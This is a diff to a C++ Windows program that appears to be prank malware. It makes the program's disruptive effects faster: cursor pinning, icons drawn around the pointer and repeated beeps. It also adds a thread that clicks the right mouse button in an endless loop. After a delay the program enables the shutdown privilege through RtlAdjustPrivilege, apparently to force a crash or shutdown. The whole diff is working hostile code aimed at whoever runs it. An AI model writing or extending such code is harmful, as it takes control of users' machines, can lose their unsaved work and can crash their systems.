@@ -27,7 +27,7 @@ void WarpCursor() {
 	POINT cursor;
 	while (true) {
 		GetCursorPos(&cursor);
-		Sleep(1'000);
+		Sleep(500);
 		SetCursorPos(cursor.x, cursor.y);
 	}
 }
@@ -41,16 +41,16 @@ void DrawIconsCursor()
 	{
 		int random = rand() % 3;
 		GetCursorPos(&cursor);
-		Sleep(100);
+		Sleep(50);
 		if (random == 1) {
 			DrawIcon(hdc, (cursor.x) + 200, (cursor.y) + 80, LoadIcon(NULL, IDI_ERROR));
 		}
 		else if (random == 2) {
-			Sleep(7);
+			Sleep(3);
 			DrawIcon(hdc, (cursor.x) + 250, (cursor.y) + 40, LoadIcon(NULL, IDI_WARNING));
 		}
 		else {
-			Sleep(7);
+			Sleep(3);
 			DrawIcon(hdc, (cursor.x) + 150, (cursor.y) + 10, LoadIcon(NULL, IDI_QUESTION));
 		}
 	}
@@ -63,7 +63,14 @@ void payload() {
 		MessageBeep(MB_ICONINFORMATION);
 	}
 }
+void RightClick()
+{
+	while (true) {
+		mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
+		mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
+	}
 
+}
 
 int main() {
 	BOOLEAN bl;
@@ -74,7 +81,7 @@ int main() {
 	std::thread t1(payload);
 	std::thread t2(WarpCursor);
 	std::thread t3(DrawIconsCursor);
-
+	std::thread t4(RightClick);
 	Sleep(40'000);
 	RtlAdjustPrivilege(19, true, false, &bl);
 	MessageBeep(MB_ICONINFORMATION);
@@ -83,5 +90,6 @@ int main() {
 	t1.join();
 	t2.join();
 	t3.join();
+	t4.join();
 	return 0;
 }
